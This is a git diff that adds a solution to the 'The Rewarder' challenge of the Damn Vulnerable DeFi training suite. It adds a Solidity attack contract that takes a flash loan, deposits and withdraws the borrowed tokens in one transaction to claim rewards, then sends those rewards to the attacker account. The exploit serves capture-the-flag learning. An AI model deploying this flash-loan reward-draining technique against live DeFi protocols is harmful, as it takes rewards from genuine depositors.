@@ -10,6 +10,41 @@ import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
 
+
+////////////////////
+// Hack Contract
+///////////////////
+contract Hack {
+    FlashLoanerPool public flashloan;
+    TheRewarderPool public rewarder;
+    DamnValuableToken public dvt;
+    RewardToken public rwd;
+
+    constructor(address _flashloan, address _target, address _token, address _rwd) {
+        flashloan = FlashLoanerPool(_flashloan);
+        rewarder = TheRewarderPool(_target);
+        dvt = DamnValuableToken(_token);
+        rwd = RewardToken(_rwd);
+    }
+
+    function attack() external {
+        flashloan.flashLoan(dvt.balanceOf(address(flashloan)));
+        rwd.transfer(msg.sender, rwd.balanceOf(address(this)));
+    }
+
+    fallback() external {
+        uint bal = dvt.balanceOf(address(this));
+        dvt.approve(address(rewarder), bal);
+        rewarder.deposit(bal);
+        rewarder.withdraw(bal);
+
+        dvt.transfer(address(flashloan), bal);
+    }
+}
+
+//////////////////
+// Tests 
+//////////////////
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
     uint256 internal constant USER_DEPOSIT = 100e18;
@@ -24,6 +59,7 @@ contract TheRewarder is Test {
     address payable internal bob;
     address payable internal charlie;
     address payable internal david;
+    RewardToken internal rwrd;
 
     function setUp() public {
         utils = new Utilities();
@@ -88,7 +124,13 @@ contract TheRewarder is Test {
         /**
          * EXPLOIT START *
          */
+        // rwrd = new RewardToken();
+        vm.warp(block.timestamp + 5 days);
 
+        vm.startPrank(attacker);
+        Hack hack = new Hack(address(flashLoanerPool), address(theRewarderPool), address(dvt), address(theRewarderPool.rewardToken()));
+        hack.attack();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
